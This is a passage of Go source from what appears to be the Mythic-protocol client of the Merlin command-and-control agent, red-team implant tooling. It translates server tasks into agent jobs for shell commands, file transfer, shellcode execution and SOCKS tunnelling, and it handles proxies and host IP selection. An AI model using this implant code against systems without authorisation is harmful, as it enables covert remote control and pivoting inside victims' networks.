				// Translate Merlin's SOCKS connection UUID to a Mythic server_id integer
				id, ok := mythicSocksConnection.Load(sockMsg.ID)
				if !ok {
					err = fmt.Errorf("there was an error mapping the SOCKS connection ID %s to the Mythic connection ID", sockMsg.ID)
					return []byte{}, err
				}
				sock.ServerId = id.(int32)

				// Base64 encode the data
				sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)
				//fmt.Printf("\t[*] SOCKS Data size: %d\n", len(sockMsg.Data))

				// Add to return messages
				returnMessage.SOCKS = append(returnMessage.SOCKS, sock)

				// Clean up the maps
				if sockMsg.Close {
					socksConnection.Delete(id)
					mythicSocksConnection.Delete(sockMsg.ID)
				}
			default:
				return []byte{}, fmt.Errorf("unhandled job type in convertToMythicMessage: %s", job.Type)
			}
		}
		// Marshal the structure to a JSON object
		if len(returnMessage.Responses) == 0 && len(returnMessage.SOCKS) == 0 {
			// Used when an input Merlin job has a SOCKS type, but we drop the message and don't want to send it to Mythic
			task := Tasking{
				Action:  TASKING,
				Size:    -1,
				Padding: m.Padding,
			}
			// Marshal the structure to a JSON object
			data, err = json.Marshal(task)
			if err != nil {
				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.CheckIn structure to JSON:\n%s", err)
			}
		} else {
			data, err = json.Marshal(returnMessage)
			if err != nil {
				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.PostResponse structure to JSON:\n%s", err)
			}
		}
	case messages.KEYEXCHANGE:
		if m.Payload != nil {
			msg := m.Payload.(rsa2.Request)
			msg.Padding = m.Padding
			data, err = json.Marshal(msg)
			if err != nil {
				return []byte{}, fmt.Errorf("there was an error marshalling the mythic.RSARequest structrong to JSON:\n%s", err)
			}
		}
	case DownloadInit:
		returnMessage := PostResponse{
			Action:  RESPONSE,
			Padding: m.Padding,
		}
		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(ClientTaskResponse))
		data, err = json.Marshal(returnMessage)
		if err != nil {
			return []byte{}, fmt.Errorf("there was an error marshalling the mythic.FileDownloadInitial structure to JSON: %s", err)
		}
	case DownloadSend:
		returnMessage := PostResponse{
			Action:  RESPONSE,
			Padding: m.Padding,
		}
		returnMessage.Responses = append(returnMessage.Responses, m.Payload.(ClientTaskResponse))
		data, err = json.Marshal(returnMessage)
		if err != nil {
			return []byte{}, fmt.Errorf("there was an error marshalling the mythic.FileDownload structure to JSON: %s", err)
		}
	default:
		return []byte{}, fmt.Errorf("unhandled message type: %d for convertToMythicMessage()", m.Type)
	}

	// Transforms
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/mythic.Construct(): Transformers: %+v", client.transformers))
	for i := len(client.transformers); i > 0; i-- {
		if client.transformers[i-1].String() == "mythic" {
			data, err = client.transformers[i-1].Construct(data, []byte(client.MythicID.String()))
		} else {
			data, err = client.transformers[i-1].Construct(data, client.secret)
		}
		cli.Message(cli.DEBUG, fmt.Sprintf("%d call with transform %s - Constructed data(%d) %T: %X\n", i, client.transformers[i-1], len(data), data, data))
		if err != nil {
			return []byte{}, fmt.Errorf("there was an error transforming the Mythic task:\n%s", err)
		}
	}

	return data, nil
}

// convertSocksToJobs takes in Mythic socks messages and translates them into Merlin jobs
func (client *Client) convertSocksToJobs(socks []Socks) (base messages.Base, err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Entering into clients.mythic.convertSocksToJobs() with %+v", socks))
	//fmt.Printf("Entering into clients.mythic.convertSocksToJobs() with %d socks messages: %+v\n", len(socks), socks)

	base.Type = messages.JOBS
	base.ID = client.AgentID

	var returnJobs []jobs.Job

	for _, sock := range socks {
		job := jobs.Job{
			AgentID: client.AgentID,
			Type:    jobs.SOCKS,
		}
		payload := jobs.Socks{
			Close: sock.Exit,
		}

		// Translate Mythic's server ID to UUID
		id, ok := socksConnection.Load(sock.ServerId)
		if !ok {
			// This is for a new, first time, SOCKS connection
			id = uuid.New()
			socksConnection.Store(sock.ServerId, id)
			mythicSocksConnection.Store(id, sock.ServerId)
			socksCounter.Store(id, 0)
			// Spoof SOCKS handshake with Merlin Agent
			payload.ID = id.(uuid.UUID)
			payload.Data = []byte{0x05, 0x01, 0x00}
			payload.Index = 0
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		}
		payload.ID = id.(uuid.UUID)

		// Base64 decode the data
		payload.Data, err = base64.StdEncoding.DecodeString(sock.Data)
		if err != nil {
			err = fmt.Errorf("there was an error base64 decoding the SOCKS message data: %s", err)
			return
		}
		//fmt.Printf("\tID: %d, Data length: %d\n", sock.ServerId, len(payload.Data))
		// Load the data packet counter
		i, ok := socksCounter.Load(id)
		if !ok {
			err = fmt.Errorf("there was an error getting the SOCKS counter for the UUID: %s", id)
			return
		}

		payload.Index = i.(int) + 1
		job.Payload = payload
		socksCounter.Store(id, i.(int)+1)
		returnJobs = append(returnJobs, job)
	}
	base.Payload = returnJobs
	return
}

// convertTasksToJobs is a function that converts Mythic tasks into a Merlin jobs structure
func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertTasksToJobs()")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input task:\n%+v", tasks))

	// Merlin messages.Base structure
	base := messages.Base{
		ID:   client.AgentID,
		Type: messages.JOBS,
	}

	var returnJobs []jobs.Job

	for _, task := range tasks {
		var mythicJob Job
		var job jobs.Job
		err := json.Unmarshal([]byte(task.Params), &mythicJob)
		if err != nil {
			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the Mythic task parameters to a mythic.Job:\n%s", err)
		}
		job.AgentID = client.AgentID
		job.ID = task.ID
		job.Token = uuid.MustParse(task.ID)
		job.Type = jobs.IntToType(mythicJob.Type)

		cli.Message(cli.DEBUG, fmt.Sprintf("Switching on mythic.Job type %d", mythicJob.Type))

		switch job.Type {
		case jobs.CMD, jobs.CONTROL, jobs.NATIVE:
			var payload jobs.Command
			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.CMD structure:\n%s", err)
			}
			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.Command structure:\n%+v", payload))
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.FILETRANSFER:
			var payload jobs.FileTransfer
			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.FileTransfer structure:\n%s", err)
			}
			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.FileTransfer structure:\n%+v", payload))
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.MODULE:
			var payload jobs.Command
			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Command structure:\n%s", err)
			}
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case jobs.SHELLCODE:
			var payload jobs.Shellcode
			err = json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.Shellcode structure:\n%s", err)
			}
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		case 0:
			// case 0 means that a job type was not added to the task from the Mythic server
			// Commonly seen with SOCKS messages
			if strings.ToLower(task.Command) == "socks" {
				cli.Message(cli.NOTE, fmt.Sprintf("Received Mythic SOCKS task: %+v", task))
				var params SocksParams
				err = json.Unmarshal([]byte(task.Params), &params)
				if err != nil {
					return base, fmt.Errorf("there was an error unmarshalling the Mythic SOCKS Params payload: %s", err)
				}
				switch params.Action {
				case "start", "stop":
					// Send message back to Mythic that SOCKS has been started/stopped
					job.Type = jobs.RESULT
					job.Payload = jobs.Results{}
					returnJobs = append(returnJobs, job)
				default:
					cli.Message(cli.WARN, fmt.Sprintf("Unknown socks command: %s", params.Action))
				}
			} else {
				cli.Message(cli.WARN, fmt.Sprintf("Unhandled Mythic task %+v", task))
			}
		default:
			return base, fmt.Errorf("unknown mythic.job type: %d", mythicJob.Type)
		}
	}

	// Add the list of jobs to the message base
	base.Payload = returnJobs

	return base, nil
}

// getProxy returns a proxy function for the passed in protocol and proxy URL if any
// Reads the HTTP_PROXY and HTTPS_PROXY environment variables if no proxy URL was passed in
func getProxy(protocol string, proxyURL string) (func(*http.Request) (*url.URL, error), error) {
	cli.Message(cli.DEBUG, "Entering into clients.http.getProxy()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Protocol: %s, Proxy: %s", protocol, proxyURL))

	// The HTTP/2 protocol does not support proxies
	if strings.ToLower(protocol) != "http" && strings.ToLower(protocol) != "https" {
		if proxyURL != "" {
			return nil, fmt.Errorf("clients/http.getProxy(): %s protocol does not support proxies; use http or https protocol", protocol)
		}
		cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.getProxy(): %s protocol does not support proxies, continuing without proxy (if any)", protocol))
		return nil, nil
	}

	var proxy func(*http.Request) (*url.URL, error)

	if proxyURL != "" {
		rawURL, errProxy := url.Parse(proxyURL)
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\n%s", errProxy.Error())
		}
		cli.Message(cli.DEBUG, fmt.Sprintf("Parsed Proxy URL: %+v", rawURL))
		proxy = http.ProxyURL(rawURL)
		return proxy, nil
	}

	// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
	var p string
	switch strings.ToLower(protocol) {
	case "http":
		p = os.Getenv("HTTP_PROXY")
	case "https":
		p = os.Getenv("HTTPS_PROXY")
	}

	if p != "" {
		cli.Message(cli.NOTE,
			fmt.Sprintf("Using proxy from environment variables for protocol %s: %s", protocol, p))
		proxy = http.ProxyFromEnvironment
	}
	return proxy, nil
}

// selectIP identifies a single IP address to associate with the agent from all interfaces on the host.
// The goal is to remove link-local and loop-back addresses.
func selectIP(ips []string) string {
	for _, ip := range ips {
		if !strings.HasPrefix(ip, "127.") && !strings.HasPrefix(ip, "::1/128") && !strings.HasPrefix(ip, "fe80::") {
			return ip
		}
	}
	return ips[0]
}
